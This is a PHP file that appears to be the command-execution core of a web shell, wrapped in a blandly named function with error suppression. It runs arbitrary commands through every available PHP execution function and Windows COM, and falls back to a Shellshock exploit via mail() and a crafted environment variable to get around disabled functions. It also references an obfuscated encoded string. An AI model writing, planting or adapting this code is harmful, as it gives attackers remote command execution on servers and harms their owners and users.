<?php

?>
<?php
function __lambda_func()
{
	function Exec_Run($cmd) 
	{
		$res = '';
		if(function_exists('exec'))
		{
			@exec($cmd,$res);
			$res = join("\n",$res);
		}
		elseif(function_exists('shell_exec'))
		{
			$res = @shell_exec($cmd);
		}
		elseif(function_exists('system'))
		{
			@ob_start();
			@system($cmd);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(function_exists('passthru'))
		{
			@ob_start();
			@passthru($cmd);
			$res = @ob_get_contents();
			@ob_end_clean();
		}
		elseif(@is_resource($f=@popen($cmd,'r')))
		{
			$res = '';
			while(!@feof($f))
			{
				$res .= @fread($f,1024);
			}
			@pclose($f);
		}
		elseif(substr(dirname($_SERVER["SCRIPT_FILENAME"]),0,1)!="/"&&class_exists('COM'))
		{
			$w=new COM('WScript.shell');
			$e=$w->exec($cmd);
			$f=$e->StdOut();
			$res=$f->ReadAll();
		}
		elseif(function_exists('proc_open'))
		{
			$length = strcspn($cmd," \t");
			$token = substr($cmd, 0, $length);
			if (isset($aliases[$token]))$cmd=$aliases[$token].substr($cmd, $length);
			$p = proc_open($cmd,array(1 => array('pipe', 'w'),2 => array('pipe', 'w')),$io);
			while (!feof($io[1])) 
			{
				$res .= htmlspecialchars(fgets($io[1]),ENT_COMPAT, 'UTF-8');
			}
			while (!feof($io[2])) 
			{
				$res .= htmlspecialchars(fgets($io[2]),ENT_COMPAT, 'UTF-8');
			}
			fclose($io[1]);
			fclose($io[2]);
			proc_close($p);
		}
		elseif(function_exists('mail'))
		{
			if(strstr(readlink("/bin/sh"), "bash") != FALSE)
			{
				$tmp = tempnam(".","data");
				putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
				mail("a@127.0.0.1","","","","-bv");
			}
			else $res="Not vuln (not bash)";
			$output = @implode('',@file($tmp));
			@unlink($tmp);
			if($output != "") $res=$output;
			else $res=JmCode("=4vofIaqtD3ohOvpiOPY0IUp0I3ot8zG");
		}
		return $res;
	}
}
?>